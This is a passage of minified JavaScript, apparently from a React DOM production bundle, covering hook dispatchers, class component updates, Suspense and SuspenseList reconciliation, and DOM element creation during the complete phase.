Oh(e,i,o){return(Ki&21)===0?(e.baseState&&(e.baseState=!1,ht=!0),e.memoizedState=o):(Ot(o,i)||(o=hu(),Oe.lanes|=o,Ji|=o,e.baseState=!0),i)}function bv(e,i){var o=Se;Se=o!==0&&4>o?o:4,e(!0);var l=vl.transition;vl.transition={};try{e(!1),i()}finally{Se=o,vl.transition=l}}function Bh(){return It().memoizedState}function vv(e,i,o){var l=Pi(e);if(o={lane:l,action:o,hasEagerState:!1,eagerState:null,next:null},Nh(e))Fh(i,o);else if(o=gh(e,i,o,l),o!==null){var u=lt();Ut(o,e,l,u),zh(o,i,l)}}function wv(e,i,o){var l=Pi(e),u={lane:l,action:o,hasEagerState:!1,eagerState:null,next:null};if(Nh(e))Fh(i,u);else{var g=e.alternate;if(e.lanes===0&&(g===null||g.lanes===0)&&(g=i.lastRenderedReducer,g!==null))try{var b=i.lastRenderedState,k=g(b,o);if(u.hasEagerState=!0,u.eagerState=k,Ot(k,b)){var A=i.interleaved;A===null?(u.next=u,pl(i)):(u.next=A.next,A.next=u),i.interleaved=u;return}}catch{}finally{}o=gh(e,i,u,l),o!==null&&(u=lt(),Ut(o,e,l,u),zh(o,i,l))}}function Nh(e){var i=e.alternate;return e===Oe||i!==null&&i===Oe}function Fh(e,i){Lr=to=!0;var o=e.pending;o===null?i.next=i:(i.next=o.next,o.next=i),e.pending=i}function zh(e,i,o){if((o&4194240)!==0){var l=i.lanes;l&=e.pendingLanes,o|=l,i.lanes=o,Ea(e,o)}}var ro={readContext:Et,useCallback:it,useContext:it,useEffect:it,useImperativeHandle:it,useInsertionEffect:it,useLayoutEffect:it,useMemo:it,useReducer:it,useRef:it,useState:it,useDebugValue:it,useDeferredValue:it,useTransition:it,useMutableSource:it,useSyncExternalStore:it,useId:it,unstable_isNewReconciler:!1},kv={readContext:Et,useCallback:function(e,i){return Jt().memoizedState=[e,i===void 0?null:i],e},useContext:Et,useEffect:Ih,useImperativeHandle:function(e,i,o){return o=o!=null?o.concat([e]):null,io(4194308,4,Dh.bind(null,i,e),o)},useLayoutEffect:function(e,i){return io(4194308,4,e,i)},useInsertionEffect:function(e,i){return io(4,2,e,i)},useMemo:function(e,i){var o=Jt();return i=i===void 0?null:i,e=e(),o.memoizedState=[e,i],e},useReducer:function(e,i,o){var l=Jt();return i=o!==void 0?o(i):i,l.memoizedState=l.baseState=i,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:i},l.queue=e,e=e.dispatch=vv.bind(null,Oe,e),[l.memoizedState,e]},useRef:function(e){var i=Jt();return e={current:e},i.memoizedState=e},useState:Ph,useDebugValue:Cl,useDeferredValue:function(e){return Jt().memoizedState=e},useTransition:function(){var e=Ph(!1),i=e[0];return e=bv.bind(null,e[1]),Jt().memoizedState=e,[i,e]},useMutableSource:function(){},useSyncExternalStore:function(e,i,o){var l=Oe,u=Jt();if(je){if(o===void 0)throw Error(r(407));o=o()}else{if(o=i(),Qe===null)throw Error(r(349));(Ki&30)!==0||xh(l,i,o)}u.memoizedState=o;var g={value:o,getSnapshot:i};return u.queue=g,Ih(Sh.bind(null,l,g,e),[e]),l.flags|=2048,Nr(9,Th.bind(null,l,g,o,i),void 0,null),o},useId:function(){var e=Jt(),i=Qe.identifierPrefix;if(je){var o=ii,l=ti;o=(l&~(1<<32-Lt(l)-1)).toString(32)+o,i=":"+i+"R"+o,o=Or++,0<o&&(i+="H"+o.toString(32)),i+=":"}else o=yv++,i=":"+i+"r"+o.toString(32)+":";return e.memoizedState=i},unstable_isNewReconciler:!1},xv={readContext:Et,useCallback:jh,useContext:Et,useEffect:Al,useImperativeHandle:Mh,useInsertionEffect:_h,useLayoutEffect:Rh,useMemo:Lh,useReducer:Tl,useRef:Eh,useState:function(){return Tl(Br)},useDebugValue:Cl,useDeferredValue:function(e){var i=It();return Oh(i,$e.memoizedState,e)},useTransition:function(){var e=Tl(Br)[0],i=It().memoizedState;return[e,i]},useMutableSource:wh,useSyncExternalStore:kh,useId:Bh,unstable_isNewReconciler:!1},Tv={readContext:Et,useCallback:jh,useContext:Et,useEffect:Al,useImperativeHandle:Mh,useInsertionEffect:_h,useLayoutEffect:Rh,useMemo:Lh,useReducer:Sl,useRef:Eh,useState:function(){return Sl(Br)},useDebugValue:Cl,useDeferredValue:function(e){var i=It();return $e===null?i.memoizedState=e:Oh(i,$e.memoizedState,e)},useTransition:function(){var e=Sl(Br)[0],i=It().memoizedState;return[e,i]},useMutableSource:wh,useSyncExternalStore:kh,useId:Bh,unstable_isNewReconciler:!1};function Nt(e,i){if(e&&e.defaultProps){i=q({},i),e=e.defaultProps;for(var o in e)i[o]===void 0&&(i[o]=e[o]);return i}return i}function Pl(e,i,o,l){i=e.memoizedState,o=o(l,i),o=o==null?i:q({},i,o),e.memoizedState=o,e.lanes===0&&(e.updateQueue.baseState=o)}var so={isMounted:function(e){return(e=e._reactInternals)?Ui(e)===e:!1},enqueueSetState:function(e,i,o){e=e._reactInternals;var l=lt(),u=Pi(e),g=ri(l,u);g.payload=i,o!=null&&(g.callback=o),i=Ti(e,g,u),i!==null&&(Ut(i,e,u,l),Ys(i,e,u))},enqueueReplaceState:function(e,i,o){e=e._reactInternals;var l=lt(),u=Pi(e),g=ri(l,u);g.tag=1,g.payload=i,o!=null&&(g.callback=o),i=Ti(e,g,u),i!==null&&(Ut(i,e,u,l),Ys(i,e,u))},enqueueForceUpdate:function(e,i){e=e._reactInternals;var o=lt(),l=Pi(e),u=ri(o,l);u.tag=2,i!=null&&(u.callback=i),i=Ti(e,u,l),i!==null&&(Ut(i,e,l,o),Ys(i,e,l))}};function Uh(e,i,o,l,u,g,b){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(l,g,b):i.prototype&&i.prototype.isPureReactComponent?!Sr(o,l)||!Sr(u,g):!0}function Vh(e,i,o){var l=!1,u=wi,g=i.contextType;return typeof g=="object"&&g!==null?g=Et(g):(u=ut(i)?Wi:tt.current,l=i.contextTypes,g=(l=l!=null)?_n(e,u):wi),i=new i(o,g),e.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,i.updater=so,e.stateNode=i,i._reactInternals=e,l&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=u,e.__reactInternalMemoizedMaskedChildContext=g),i}function Wh(e,i,o,l){e=i.state,typeof i.componentWillReceiveProps=="function"&&i.componentWillReceiveProps(o,l),typeof i.UNSAFE_componentWillReceiveProps=="function"&&i.UNSAFE_componentWillReceiveProps(o,l),i.state!==e&&so.enqueueReplaceState(i,i.state,null)}function El(e,i,o,l){var u=e.stateNode;u.props=o,u.state=e.memoizedState,u.refs={},fl(e);var g=i.contextType;typeof g=="object"&&g!==null?u.context=Et(g):(g=ut(i)?Wi:tt.current,u.context=_n(e,g)),u.state=e.memoizedState,g=i.getDerivedStateFromProps,typeof g=="function"&&(Pl(e,i,g,o),u.state=e.memoizedState),typeof i.getDerivedStateFromProps=="function"||typeof u.getSnapshotBeforeUpdate=="function"||typeof u.UNSAFE_componentWillMount!="function"&&typeof u.componentWillMount!="function"||(i=u.state,typeof u.componentWillMount=="function"&&u.componentWillMount(),typeof u.UNSAFE_componentWillMount=="function"&&u.UNSAFE_componentWillMount(),i!==u.state&&so.enqueueReplaceState(u,u.state,null),Xs(e,o,u,l),u.state=e.memoizedState),typeof u.componentDidMount=="function"&&(e.flags|=4194308)}function Nn(e,i){try{var o="",l=i;do o+=be(l),l=l.return;while(l);var u=o}catch(g){u=`
Error generating stack: `+g.message+`
`+g.stack}return{value:e,source:i,stack:u,digest:null}}function Il(e,i,o){return{value:e,source:null,stack:o??null,digest:i??null}}function _l(e,i){try{console.error(i.value)}catch(o){setTimeout(function(){throw o})}}var Sv=typeof WeakMap=="function"?WeakMap:Map;function Hh(e,i,o){o=ri(-1,o),o.tag=3,o.payload={element:null};var l=i.value;return o.callback=function(){po||(po=!0,$l=l),_l(e,i)},o}function $h(e,i,o){o=ri(-1,o),o.tag=3;var l=e.type.getDerivedStateFromError;if(typeof l=="function"){var u=i.value;o.payload=function(){return l(u)},o.callback=function(){_l(e,i)}}var g=e.stateNode;return g!==null&&typeof g.componentDidCatch=="function"&&(o.callback=function(){_l(e,i),typeof l!="function"&&(Ai===null?Ai=new Set([this]):Ai.add(this));var b=i.stack;this.componentDidCatch(i.value,{componentStack:b!==null?b:""})}),o}function Gh(e,i,o){var l=e.pingCache;if(l===null){l=e.pingCache=new Sv;var u=new Set;l.set(i,u)}else u=l.get(i),u===void 0&&(u=new Set,l.set(i,u));u.has(o)||(u.add(o),e=Nv.bind(null,e,i,o),i.then(e,e))}function qh(e){do{var i;if((i=e.tag===13)&&(i=e.memoizedState,i=i!==null?i.dehydrated!==null:!0),i)return e;e=e.return}while(e!==null);return null}function Kh(e,i,o,l,u){return(e.mode&1)===0?(e===i?e.flags|=65536:(e.flags|=128,o.flags|=131072,o.flags&=-52805,o.tag===1&&(o.alternate===null?o.tag=17:(i=ri(-1,1),i.tag=2,Ti(o,i,1))),o.lanes|=1),e):(e.flags|=65536,e.lanes=u,e)}var Av=L.ReactCurrentOwner,ht=!1;function at(e,i,o,l){i.child=e===null?fh(i,null,o,l):jn(i,e.child,o,l)}function Jh(e,i,o,l,u){o=o.render;var g=i.ref;return On(i,u),l=kl(e,i,o,l,g,u),o=xl(),e!==null&&!ht?(i.updateQueue=e.updateQueue,i.flags&=-2053,e.lanes&=~u,si(e,i,u)):(je&&o&&rl(i),i.flags|=1,at(e,i,l,u),i.child)}function Qh(e,i,o,l,u){if(e===null){var g=o.type;return typeof g=="function"&&!Xl(g)&&g.defaultProps===void 0&&o.compare===null&&o.defaultProps===void 0?(i.tag=15,i.type=g,Yh(e,i,g,l,u)):(e=vo(o.type,null,l,i,i.mode,u),e.ref=i.ref,e.return=i,i.child=e)}if(g=e.child,(e.lanes&u)===0){var b=g.memoizedProps;if(o=o.compare,o=o!==null?o:Sr,o(b,l)&&e.ref===i.ref)return si(e,i,u)}return i.flags|=1,e=Ii(g,l),e.ref=i.ref,e.return=i,i.child=e}function Yh(e,i,o,l,u){if(e!==null){var g=e.memoizedProps;if(Sr(g,l)&&e.ref===i.ref)if(ht=!1,i.pendingProps=l=g,(e.lanes&u)!==0)(e.flags&131072)!==0&&(ht=!0);else return i.lanes=e.lanes,si(e,i,u)}return Rl(e,i,o,l,u)}function Xh(e,i,o){var l=i.pendingProps,u=l.children,g=e!==null?e.memoizedState:null;if(l.mode==="hidden")if((i.mode&1)===0)i.memoizedState={baseLanes:0,cachePool:null,transitions:null},Ee(zn,kt),kt|=o;else{if((o&1073741824)===0)return e=g!==null?g.baseLanes|o:o,i.lanes=i.childLanes=1073741824,i.memoizedState={baseLanes:e,cachePool:null,transitions:null},i.updateQueue=null,Ee(zn,kt),kt|=e,null;i.memoizedState={baseLanes:0,cachePool:null,transitions:null},l=g!==null?g.baseLanes:o,Ee(zn,kt),kt|=l}else g!==null?(l=g.baseLanes|o,i.memoizedState=null):l=o,Ee(zn,kt),kt|=l;return at(e,i,u,o),i.child}function Zh(e,i){var o=i.ref;(e===null&&o!==null||e!==null&&e.ref!==o)&&(i.flags|=512,i.flags|=2097152)}function Rl(e,i,o,l,u){var g=ut(o)?Wi:tt.current;return g=_n(i,g),On(i,u),o=kl(e,i,o,l,g,u),l=xl(),e!==null&&!ht?(i.updateQueue=e.updateQueue,i.flags&=-2053,e.lanes&=~u,si(e,i,u)):(je&&l&&rl(i),i.flags|=1,at(e,i,o,u),i.child)}function ep(e,i,o,l,u){if(ut(o)){var g=!0;Ws(i)}else g=!1;if(On(i,u),i.stateNode===null)ao(e,i),Vh(i,o,l),El(i,o,l,u),l=!0;else if(e===null){var b=i.stateNode,k=i.memoizedProps;b.props=k;var A=b.context,j=o.contextType;typeof j=="object"&&j!==null?j=Et(j):(j=ut(o)?Wi:tt.current,j=_n(i,j));var F=o.getDerivedStateFromProps,z=typeof F=="function"||typeof b.getSnapshotBeforeUpdate=="function";z||typeof b.UNSAFE_componentWillReceiveProps!="function"&&typeof b.componentWillReceiveProps!="function"||(k!==l||A!==j)&&Wh(i,b,l,j),xi=!1;var N=i.memoizedState;b.state=N,Xs(i,l,b,u),A=i.memoizedState,k!==l||N!==A||dt.current||xi?(typeof F=="function"&&(Pl(i,o,F,l),A=i.memoizedState),(k=xi||Uh(i,o,k,l,N,A,j))?(z||typeof b.UNSAFE_componentWillMount!="function"&&typeof b.componentWillMount!="function"||(typeof b.componentWillMount=="function"&&b.componentWillMount(),typeof b.UNSAFE_componentWillMount=="function"&&b.UNSAFE_componentWillMount()),typeof b.componentDidMount=="function"&&(i.flags|=4194308)):(typeof b.componentDidMount=="function"&&(i.flags|=4194308),i.memoizedProps=l,i.memoizedState=A),b.props=l,b.state=A,b.context=j,l=k):(typeof b.componentDidMount=="function"&&(i.flags|=4194308),l=!1)}else{b=i.stateNode,mh(e,i),k=i.memoizedProps,j=i.type===i.elementType?k:Nt(i.type,k),b.props=j,z=i.pendingProps,N=b.context,A=o.contextType,typeof A=="object"&&A!==null?A=Et(A):(A=ut(o)?Wi:tt.current,A=_n(i,A));var K=o.getDerivedStateFromProps;(F=typeof K=="function"||typeof b.getSnapshotBeforeUpdate=="function")||typeof b.UNSAFE_componentWillReceiveProps!="function"&&typeof b.componentWillReceiveProps!="function"||(k!==z||N!==A)&&Wh(i,b,l,A),xi=!1,N=i.memoizedState,b.state=N,Xs(i,l,b,u);var Z=i.memoizedState;k!==z||N!==Z||dt.current||xi?(typeof K=="function"&&(Pl(i,o,K,l),Z=i.memoizedState),(j=xi||Uh(i,o,j,l,N,Z,A)||!1)?(F||typeof b.UNSAFE_componentWillUpdate!="function"&&typeof b.componentWillUpdate!="function"||(typeof b.componentWillUpdate=="function"&&b.componentWillUpdate(l,Z,A),typeof b.UNSAFE_componentWillUpdate=="function"&&b.UNSAFE_componentWillUpdate(l,Z,A)),typeof b.componentDidUpdate=="function"&&(i.flags|=4),typeof b.getSnapshotBeforeUpdate=="function"&&(i.flags|=1024)):(typeof b.componentDidUpdate!="function"||k===e.memoizedProps&&N===e.memoizedState||(i.flags|=4),typeof b.getSnapshotBeforeUpdate!="function"||k===e.memoizedProps&&N===e.memoizedState||(i.flags|=1024),i.memoizedProps=l,i.memoizedState=Z),b.props=l,b.state=Z,b.context=A,l=j):(typeof b.componentDidUpdate!="function"||k===e.memoizedProps&&N===e.memoizedState||(i.flags|=4),typeof b.getSnapshotBeforeUpdate!="function"||k===e.memoizedProps&&N===e.memoizedState||(i.flags|=1024),l=!1)}return Dl(e,i,o,l,g,u)}function Dl(e,i,o,l,u,g){Zh(e,i);var b=(i.flags&128)!==0;if(!l&&!b)return u&&sh(i,o,!1),si(e,i,g);l=i.stateNode,Av.current=i;var k=b&&typeof o.getDerivedStateFromError!="function"?null:l.render();return i.flags|=1,e!==null&&b?(i.child=jn(i,e.child,null,g),i.child=jn(i,null,k,g)):at(e,i,k,g),i.memoizedState=l.state,u&&sh(i,o,!0),i.child}function tp(e){var i=e.stateNode;i.pendingContext?nh(e,i.pendingContext,i.pendingContext!==i.context):i.context&&nh(e,i.context,!1),gl(e,i.containerInfo)}function ip(e,i,o,l,u){return Mn(),ll(u),i.flags|=256,at(e,i,o,l),i.child}var Ml={dehydrated:null,treeContext:null,retryLane:0};function jl(e){return{baseLanes:e,cachePool:null,transitions:null}}function np(e,i,o){var l=i.pendingProps,u=Le.current,g=!1,b=(i.flags&128)!==0,k;if((k=b)||(k=e!==null&&e.memoizedState===null?!1:(u&2)!==0),k?(g=!0,i.flags&=-129):(e===null||e.memoizedState!==null)&&(u|=1),Ee(Le,u&1),e===null)return al(i),e=i.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?((i.mode&1)===0?i.lanes=1:e.data==="$!"?i.lanes=8:i.lanes=1073741824,null):(b=l.children,e=l.fallback,g?(l=i.mode,g=i.child,b={mode:"hidden",children:b},(l&1)===0&&g!==null?(g.childLanes=0,g.pendingProps=b):g=wo(b,l,0,null),e=Zi(e,l,o,null),g.return=i,e.return=i,g.sibling=e,i.child=g,i.child.memoizedState=jl(o),i.memoizedState=Ml,e):Ll(i,b));if(u=e.memoizedState,u!==null&&(k=u.dehydrated,k!==null))return Cv(e,i,b,l,k,u,o);if(g){g=l.fallback,b=i.mode,u=e.child,k=u.sibling;var A={mode:"hidden",children:l.children};return(b&1)===0&&i.child!==u?(l=i.child,l.childLanes=0,l.pendingProps=A,i.deletions=null):(l=Ii(u,A),l.subtreeFlags=u.subtreeFlags&14680064),k!==null?g=Ii(k,g):(g=Zi(g,b,o,null),g.flags|=2),g.return=i,l.return=i,l.sibling=g,i.child=l,l=g,g=i.child,b=e.child.memoizedState,b=b===null?jl(o):{baseLanes:b.baseLanes|o,cachePool:null,transitions:b.transitions},g.memoizedState=b,g.childLanes=e.childLanes&~o,i.memoizedState=Ml,l}return g=e.child,e=g.sibling,l=Ii(g,{mode:"visible",children:l.children}),(i.mode&1)===0&&(l.lanes=o),l.return=i,l.sibling=null,e!==null&&(o=i.deletions,o===null?(i.deletions=[e],i.flags|=16):o.push(e)),i.child=l,i.memoizedState=null,l}function Ll(e,i){return i=wo({mode:"visible",children:i},e.mode,0,null),i.return=e,e.child=i}function oo(e,i,o,l){return l!==null&&ll(l),jn(i,e.child,null,o),e=Ll(i,i.pendingProps.children),e.flags|=2,i.memoizedState=null,e}function Cv(e,i,o,l,u,g,b){if(o)return i.flags&256?(i.flags&=-257,l=Il(Error(r(422))),oo(e,i,b,l)):i.memoizedState!==null?(i.child=e.child,i.flags|=128,null):(g=l.fallback,u=i.mode,l=wo({mode:"visible",children:l.children},u,0,null),g=Zi(g,u,b,null),g.flags|=2,l.return=i,g.return=i,l.sibling=g,i.child=l,(i.mode&1)!==0&&jn(i,e.child,null,b),i.child.memoizedState=jl(b),i.memoizedState=Ml,g);if((i.mode&1)===0)return oo(e,i,b,null);if(u.data==="$!"){if(l=u.nextSibling&&u.nextSibling.dataset,l)var k=l.dgst;return l=k,g=Error(r(419)),l=Il(g,l,void 0),oo(e,i,b,l)}if(k=(b&e.childLanes)!==0,ht||k){if(l=Qe,l!==null){switch(b&-b){case 4:u=2;break;case 16:u=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:u=32;break;case 536870912:u=268435456;break;default:u=0}u=(u&(l.suspendedLanes|b))!==0?0:u,u!==0&&u!==g.retryLane&&(g.retryLane=u,ni(e,u),Ut(l,e,u,-1))}return Yl(),l=Il(Error(r(421))),oo(e,i,b,l)}return u.data==="$?"?(i.flags|=128,i.child=e.child,i=Fv.bind(null,e),u._reactRetry=i,null):(e=g.treeContext,wt=bi(u.nextSibling),vt=i,je=!0,Bt=null,e!==null&&(Ct[Pt++]=ti,Ct[Pt++]=ii,Ct[Pt++]=Hi,ti=e.id,ii=e.overflow,Hi=i),i=Ll(i,l.children),i.flags|=4096,i)}function rp(e,i,o){e.lanes|=i;var l=e.alternate;l!==null&&(l.lanes|=i),hl(e.return,i,o)}function Ol(e,i,o,l,u){var g=e.memoizedState;g===null?e.memoizedState={isBackwards:i,rendering:null,renderingStartTime:0,last:l,tail:o,tailMode:u}:(g.isBackwards=i,g.rendering=null,g.renderingStartTime=0,g.last=l,g.tail=o,g.tailMode=u)}function sp(e,i,o){var l=i.pendingProps,u=l.revealOrder,g=l.tail;if(at(e,i,l.children,o),l=Le.current,(l&2)!==0)l=l&1|2,i.flags|=128;else{if(e!==null&&(e.flags&128)!==0)e:for(e=i.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&rp(e,o,i);else if(e.tag===19)rp(e,o,i);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===i)break e;for(;e.sibling===null;){if(e.return===null||e.return===i)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}l&=1}if(Ee(Le,l),(i.mode&1)===0)i.memoizedState=null;else switch(u){case"forwards":for(o=i.child,u=null;o!==null;)e=o.alternate,e!==null&&Zs(e)===null&&(u=o),o=o.sibling;o=u,o===null?(u=i.child,i.child=null):(u=o.sibling,o.sibling=null),Ol(i,!1,u,o,g);break;case"backwards":for(o=null,u=i.child,i.child=null;u!==null;){if(e=u.alternate,e!==null&&Zs(e)===null){i.child=u;break}e=u.sibling,u.sibling=o,o=u,u=e}Ol(i,!0,o,null,g);break;case"together":Ol(i,!1,null,null,void 0);break;default:i.memoizedState=null}return i.child}function ao(e,i){(i.mode&1)===0&&e!==null&&(e.alternate=null,i.alternate=null,i.flags|=2)}function si(e,i,o){if(e!==null&&(i.dependencies=e.dependencies),Ji|=i.lanes,(o&i.childLanes)===0)return null;if(e!==null&&i.child!==e.child)throw Error(r(153));if(i.child!==null){for(e=i.child,o=Ii(e,e.pendingProps),i.child=o,o.return=i;e.sibling!==null;)e=e.sibling,o=o.sibling=Ii(e,e.pendingProps),o.return=i;o.sibling=null}return i.child}function Pv(e,i,o){switch(i.tag){case 3:tp(i),Mn();break;case 5:vh(i);break;case 1:ut(i.type)&&Ws(i);break;case 4:gl(i,i.stateNode.containerInfo);break;case 10:var l=i.type._context,u=i.memoizedProps.value;Ee(Js,l._currentValue),l._currentValue=u;break;case 13:if(l=i.memoizedState,l!==null)return l.dehydrated!==null?(Ee(Le,Le.current&1),i.flags|=128,null):(o&i.child.childLanes)!==0?np(e,i,o):(Ee(Le,Le.current&1),e=si(e,i,o),e!==null?e.sibling:null);Ee(Le,Le.current&1);break;case 19:if(l=(o&i.childLanes)!==0,(e.flags&128)!==0){if(l)return sp(e,i,o);i.flags|=128}if(u=i.memoizedState,u!==null&&(u.rendering=null,u.tail=null,u.lastEffect=null),Ee(Le,Le.current),l)break;return null;case 22:case 23:return i.lanes=0,Xh(e,i,o)}return si(e,i,o)}var op,Bl,ap,lp;op=function(e,i){for(var o=i.child;o!==null;){if(o.tag===5||o.tag===6)e.appendChild(o.stateNode);else if(o.tag!==4&&o.child!==null){o.child.return=o,o=o.child;continue}if(o===i)break;for(;o.sibling===null;){if(o.return===null||o.return===i)return;o=o.return}o.sibling.return=o.return,o=o.sibling}},Bl=function(){},ap=function(e,i,o,l){var u=e.memoizedProps;if(u!==l){e=i.stateNode,qi(Kt.current);var g=null;switch(o){case"input":u=ha(e,u),l=ha(e,l),g=[];break;case"select":u=q({},u,{value:void 0}),l=q({},l,{value:void 0}),g=[];break;case"textarea":u=ga(e,u),l=ga(e,l),g=[];break;default:typeof u.onClick!="function"&&typeof l.onClick=="function"&&(e.onclick=zs)}ya(o,l);var b;o=null;for(j in u)if(!l.hasOwnProperty(j)&&u.hasOwnProperty(j)&&u[j]!=null)if(j==="style"){var k=u[j];for(b in k)k.hasOwnProperty(b)&&(o||(o={}),o[b]="")}else j!=="dangerouslySetInnerHTML"&&j!=="children"&&j!=="suppressContentEditableWarning"&&j!=="suppressHydrationWarning"&&j!=="autoFocus"&&(a.hasOwnProperty(j)?g||(g=[]):(g=g||[]).push(j,null));for(j in l){var A=l[j];if(k=u?.[j],l.hasOwnProperty(j)&&A!==k&&(A!=null||k!=null))if(j==="style")if(k){for(b in k)!k.hasOwnProperty(b)||A&&A.hasOwnProperty(b)||(o||(o={}),o[b]="");for(b in A)A.hasOwnProperty(b)&&k[b]!==A[b]&&(o||(o={}),o[b]=A[b])}else o||(g||(g=[]),g.push(j,o)),o=A;else j==="dangerouslySetInnerHTML"?(A=A?A.__html:void 0,k=k?k.__html:void 0,A!=null&&k!==A&&(g=g||[]).push(j,A)):j==="children"?typeof A!="string"&&typeof A!="number"||(g=g||[]).push(j,""+A):j!=="suppressContentEditableWarning"&&j!=="suppressHydrationWarning"&&(a.hasOwnProperty(j)?(A!=null&&j==="onScroll"&&Re("scroll",e),g||k===A||(g=[])):(g=g||[]).push(j,A))}o&&(g=g||[]).push("style",o);var j=g;(i.updateQueue=j)&&(i.flags|=4)}},lp=function(e,i,o,l){o!==l&&(i.flags|=4)};function Fr(e,i){if(!je)switch(e.tailMode){case"hidden":i=e.tail;for(var o=null;i!==null;)i.alternate!==null&&(o=i),i=i.sibling;o===null?e.tail=null:o.sibling=null;break;case"collapsed":o=e.tail;for(var l=null;o!==null;)o.alternate!==null&&(l=o),o=o.sibling;l===null?i||e.tail===null?e.tail=null:e.tail.sibling=null:l.sibling=null}}function nt(e){var i=e.alternate!==null&&e.alternate.child===e.child,o=0,l=0;if(i)for(var u=e.child;u!==null;)o|=u.lanes|u.childLanes,l|=u.subtreeFlags&14680064,l|=u.flags&14680064,u.return=e,u=u.sibling;else for(u=e.child;u!==null;)o|=u.lanes|u.childLanes,l|=u.subtreeFlags,l|=u.flags,u.return=e,u=u.sibling;return e.subtreeFlags|=l,e.childLanes=o,i}function Ev(e,i,o){var l=i.pendingProps;switch(sl(i),i.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return nt(i),null;case 1:return ut(i.type)&&Vs(),nt(i),null;case 3:return l=i.stateNode,Bn(),De(dt),De(tt),bl(),l.pendingContext&&(l.context=l.pendingContext,l.pendingContext=null),(e===null||e.child===null)&&(qs(i)?i.flags|=4:e===null||e.memoizedState.isDehydrated&&(i.flags&256)===0||(i.flags|=1024,Bt!==null&&(Kl(Bt),Bt=null))),Bl(e,i),nt(i),null;case 5:ml(i);var u=qi(jr.current);if(o=i.type,e!==null&&i.stateNode!=null)ap(e,i,o,l,u),e.ref!==i.ref&&(i.flags|=512,i.flags|=2097152);else{if(!l){if(i.stateNode===null)throw Error(r(166));return nt(i),null}if(e=qi(Kt.current),qs(i)){l=i.stateNode,o=i.type;var g=i.memoizedProps;switch(l[qt]=i,l[Ir]=g,e=(i.mode&1)!==0,o){case"dialog":Re("cancel",l),Re("close",l);break;case"iframe":case"object":case"embed":Re("load",l);break;case"video":case"audio":for(u=0;u<Cr.length;u++)Re(Cr[u],l);break;case"source":Re("error",l);break;case"img":case"image":case"link":Re("error",l),Re("load",l);break;case"details":Re("toggle",l);break;case"input":Vd(l,g),Re("invalid",l);break;case"select":l._wrapperState={wasMultiple:!!g.multiple},Re("invalid",l);break;case"textarea":$d(l,g),Re("invalid",l)}ya(o,g),u=null;for(var b in g)if(g.hasOwnProperty(b)){var k=g[b];b==="children"?typeof k=="string"?l.textContent!==k&&(g.suppressHydrationWarning!==!0&&Fs(l.textContent,k,e),u=["children",k]):typeof k=="number"&&l.textContent!==""+k&&(g.suppressHydrationWarning!==!0&&Fs(l.textContent,k,e),u=["children",""+k]):a.hasOwnProperty(b)&&k!=null&&b==="onScroll"&&Re("scroll",l)}switch(o){case"input":At(l),Hd(l,g,!0);break;case"textarea":At(l),qd(l);break;case"select":case"option":break;default:typeof g.onClick=="function"&&(l.onclick=zs)}l=u,i.updateQueue=l,l!==null&&(i.flags|=4)}else{b=u.nodeType===9?u:u.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Kd(o)),e==="http://www.w3.org/1999/xhtml"?o==="script"?(e=b.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof l.is=="string"?e=b.createElement(o,{is:l.is}):(e=b.createElement(o),o==="select"&&(b=e,l.multiple?b.multiple=!0:l.size&&(b.size=l.size))):e=b.createElementNS(e,o),e[qt]=i,e[Ir]=l,op(e,i,!1,!1),i.stateNode=e;e:{switch(b=ba(o,l),o){case"dialog":Re("cancel",e),Re("close",e),u=l;break;case"iframe":case"object":case"embed":Re("load",e),u=l;break;case"video":case"audio":for(u=0;u<Cr.length;u++)Re(Cr[u],e);u=l;break;case"source":Re("error",e),u=l;break;case"img":case"image":case"link":Re("error",e),Re("load",e),u=l;break;case"details":Re("toggle",e),u=l;break;case"input":Vd(e,l),u=ha(e,l),Re("invalid",e);break;case"option":u=l;break;case"select":e._wrapperState={wasMultiple:!!l.multiple},u=q({},l,{value:void 0}),Re("invalid",e);break;case"textarea":$d(e,l),u=ga(e,l),Re("invalid",e);break;default:u=l}ya(o,u),k=u;for(g in k)if(k.hasOwnProperty(g)){var A=k[g];g==="style"?Yd(e,A):g==="dangerouslySetInnerHTML"?(A=A?A.__html:void 0,A!=null&&Jd(e,A)):g==="children"?typeof A=="string"?(o!=="textarea"||A!=="")&&ar(e,A):typeof A=="number"&&ar(e,""+A):g!=="suppressContentEditableWarning"&&g!=="suppressHydrationWarning"&&g!=="autoFocus"&&(a.hasOwnProperty(g)?A!=null&&g==="onScroll"&&Re("scroll",e):A!=null&&M(e,g,A,b))}switch(o){case"input":At(e),Hd(e,l,!1);break;case"textarea":At(e),qd(e);break;case"option":l.value!=null&&e.setAttribute("value",""+xe(l.value));break;case"select":e.multiple=!!l.multiple,g=l.value,g!=null?bn(e,!!l.multiple,g,!1):l.defaultValue!=null&&bn(e,!!l.multiple,l.defaultValue,!0);break;default:typeof u.onClick=="function"&&(e.onclick=zs)}switch(o){case"button":case"input":case"select":case"textarea":l=!!l.autoFocus;break e;case"img":l=!0;break e;default:l=!1}}l&&(i.flags|=4)}i.ref!==null&&(i.flags|=512,i.flags|=2097152)}return nt(i),null;case 6:if(e&&i.stateNode!=null)lp(e,i,e.memoizedProps,l);else{if(typeof l!="string"&&i.stateNode===null)throw Error(r(166));if(o=qi(jr.current),qi(Kt.current),qs(i)){if(l=i.stateNode,o=i.memoizedProps,l[qt]=i,(g=l.nodeValue!==o)&&(e=vt,e!==null))switch(e.tag){case 3:Fs(l.nodeValue,o,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&Fs(l.nodeValue,o,(e.mode&1)!==0)}g&&(i.flags|=4)}else 